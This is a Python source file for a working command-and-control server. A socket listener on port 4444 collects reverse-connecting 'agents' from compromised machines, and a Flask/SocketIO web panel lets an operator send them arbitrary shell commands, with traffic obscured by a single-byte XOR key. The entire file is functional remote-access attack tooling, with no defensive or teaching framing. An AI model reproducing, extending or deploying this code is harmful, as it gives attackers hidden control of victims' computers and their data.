#!/usr/bin/env python3
from flask import Flask, render_template, request, jsonify
from flask_socketio import SocketIO, emit
import socket
import threading
import time

app = Flask(__name__)
app.config['SECRET_KEY'] = 'c2-secret-key-2024'
socketio = SocketIO(app, cors_allowed_origins="*")

XOR_KEY = 0x42
agents = {}
command_history = {}

def xor_crypt(data):
    return bytes([b ^ XOR_KEY for b in data])

class Agent:
    def __init__(self, conn, addr):
        self.conn = conn
        self.addr = addr
        self.id = f"{addr[0]}:{addr[1]}"
        self.hostname = "Unknown"
        self.username = "Unknown"
        self.os = "Unknown"
        self.cwd = "Unknown"
        self.status = "Active"
        self.last_seen = time.time()
        
    def send_command(self, cmd):
        try:
            encrypted = xor_crypt(cmd.encode())
            self.conn.send(encrypted + b'\n')
            
            response = b''
            while True:
                chunk = self.conn.recv(8192)
                if not chunk:
                    break
                response += chunk
                if b'\n' in chunk:
                    break
            
            if response.endswith(b'\n'):
                response = response[:-1]
            
            decrypted = xor_crypt(response)
            self.last_seen = time.time()
            return decrypted.decode('utf-8', errors='ignore')
        except Exception as e:
            self.status = "Disconnected"
            return f"Error: {str(e)}"
    
    def parse_sysinfo(self, data):
        try:
            parts = data.split('|')
            if len(parts) >= 5:
                self.hostname = parts[1]
                self.username = parts[2]
                self.os = parts[3]
                self.cwd = parts[4]
        except:
            pass

def handle_agent(conn, addr):
    agent = Agent(conn, addr)
    
    try:
        # Receive system info
        data = conn.recv(1024)
        if data:
            sysinfo = data.decode('utf-8', errors='ignore')
            agent.parse_sysinfo(sysinfo)
            agents[agent.id] = agent
            command_history[agent.id] = []
            
            # Notify all clients
            socketio.emit('agent_connected', {
                'id': agent.id,
                'hostname': agent.hostname,
                'username': agent.username,
                'os': agent.os,
                'cwd': agent.cwd
            })
        
        # Keep connection alive
        while agent.status == "Active":
            time.sleep(1)
            
    except Exception as e:
        print(f"Agent error: {e}")
    finally:
        if agent.id in agents:
            agents[agent.id].status = "Disconnected"
            socketio.emit('agent_disconnected', {'id': agent.id})

def start_listener():
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', 4444))
    server.listen(5)
    print("[*] C2 Listener started on port 4444")
    
    while True:
        conn, addr = server.accept()
        thread = threading.Thread(target=handle_agent, args=(conn, addr))
        thread.daemon = True
        thread.start()

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def handle_connect():
    # Send current agents list
    agent_list = []
    for agent_id, agent in agents.items():
        agent_list.append({
            'id': agent.id,
            'hostname': agent.hostname,
            'username': agent.username,
            'os': agent.os,
            'cwd': agent.cwd,
            'status': agent.status,
            'last_seen': int(time.time() - agent.last_seen)
        })
    emit('agent_list', agent_list)

@socketio.on('execute_command')
def handle_command(data):
    agent_id = data['agent_id']
    command = data['command']
    
    if agent_id not in agents:
        emit('command_result', {'error': 'Agent not found'})
        return
    
    agent = agents[agent_id]
    result = agent.send_command(command)
    
    # Update CWD if cd command
    if command.startswith('cd '):
        lines = result.strip().split('\n')
        if lines and len(lines[0]) < 100:
            agent.cwd = lines[0]
    
    # Store in history
    command_history[agent_id].append({
        'command': command,
        'result': result,
        'timestamp': time.time()
    })
    
    emit('command_result', {
        'agent_id': agent_id,
        'command': command,
        'result': result
    })

if __name__ == '__main__':
    # Start listener thread
    listener_thread = threading.Thread(target=start_listener)
    listener_thread.daemon = True
    listener_thread.start()
    
    print("[*] C2 Web Interface starting on http://0.0.0.0:5000")
    socketio.run(app, host='0.0.0.0', port=5000, debug=False)